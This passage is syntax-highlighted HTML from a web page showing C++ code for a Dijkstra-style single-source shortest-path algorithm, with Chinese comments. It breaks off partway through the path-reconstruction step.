id=\"crayon-5b4a935ca7a84983046531-9\"><span class=\"crayon-p\">#include &lt;iostream&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-10\"><span class=\"crayon-p\">#include &lt;vector&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-11\"><span class=\"crayon-p\">#include &lt;queue&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-12\"><span class=\"crayon-p\">#include &lt;limits&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-13\"><span class=\"crayon-e\">using </span><span class=\"crayon-t\">namespace</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">std</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-14\"> </div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-15\"><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">node_info</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-16\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-17\"><span class=\"crayon-m\">public</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">node_info</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">w</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">index</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">weight</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">w</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">node_info</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">index</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">weight</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">node_info</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">node_info</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ni</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-23\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">index</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ni</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">weight</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ni</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">weight</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-24\"> </div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-25\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">friend </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-26\"><span class=\"crayon-e\">    </span><span class=\"crayon-t\">bool</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">operator</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">node_info</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">lth</span><span class=\"crayon-sy\">,</span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">node_info</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rth</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">lth</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">weight</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rth</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">weight</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 为了实现从小到大的顺序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-28\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-29\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-30\"><span class=\"crayon-m\">public</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-31\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 结点位置</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-32\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">weight</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 权值</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-33\"><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-34\"> </div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-35\"><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">path_info</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-36\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-37\"><span class=\"crayon-m\">public</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-38\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">path_info</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-39\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">front_index</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">weight</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">numeric_limits</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">int</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">::</span><span class=\"crayon-e\">max</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-40\"> </div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-41\"><span class=\"crayon-m\">public</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-42\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">front_index</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-43\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">weight</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-44\"><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-45\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-46\"><span class=\"crayon-c\">// single source shortest paths</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-47\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ss_shortest_paths</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-48\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-49\"><span class=\"crayon-h\">     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-50\"><span class=\"crayon-m\">public</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-51\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">ss_shortest_paths</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">vector</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">vector</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">int</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">g</span><span class=\"crayon-sy\">,</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">end_location</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-52\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">no_edge</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">end_node</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">end_location</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">node_count</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">g</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">size</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">graph</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">g</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-53\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-54\"> </div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-55\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 打印最短路径</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-56\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">print_spaths</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-57\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">cout</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"min weight : \"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">shortest_path</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">endl</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-58\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">cout</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"path: \"</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-59\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">copy</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">s_path_index</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">rbegin</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">s_path_index</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">rend</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-60\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">ostream_iterator</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">int</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cout</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\" \"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-61\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">cout</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">endl</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-62\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-63\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-64\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 求最短路径</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-65\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">shortest_paths</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-66\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">vector</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">path_info</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">path</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">node_count</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-67\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">priority_queue</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">node_info</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">vector</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">node_info</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">min_heap</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-68\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">min_heap</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">push</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">node_info</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 将起始结点入队</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-69\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-70\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-71\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">node_info </span><span class=\"crayon-v\">top</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">min_heap</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">top</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 取出最大值</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-72\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">min_heap</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">pop</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-73\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-74\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">// 已到达目的结点</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-75\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">top</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">index</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">end_node</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-76\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">break</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-77\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-78\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">// 未到达则遍历</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-79\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">node_count</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">++</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-80\"><span class=\"crayon-h\">                </span><span class=\"crayon-c\">// 顶点top.index和i间有边，且此路径长小于原先从原点到i的路径长 </span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-81\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">top</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">no_edge</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-82\"><span class=\"crayon-h\">                    </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">top</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">weight</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">top</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">path</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">weight</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-83\"><span class=\"crayon-h\">                    </span><span class=\"crayon-v\">min_heap</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">push</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">node_info</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">top</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">weight</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">top</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-84\"><span class=\"crayon-h\">                    </span><span class=\"crayon-v\">path</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">front_index</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">top</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-85\"><span class=\"crayon-h\">                    </span><span class=\"crayon-v\">path</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">weight</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">top</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">weight</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">top</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-86\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-87\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-88\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">min_heap</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">empty</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-89\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">break</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-90\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-91\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-92\"> </div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-93\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">shortest_path</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">path</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">end_node</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">weight</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-94\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">index</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">end_node</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" 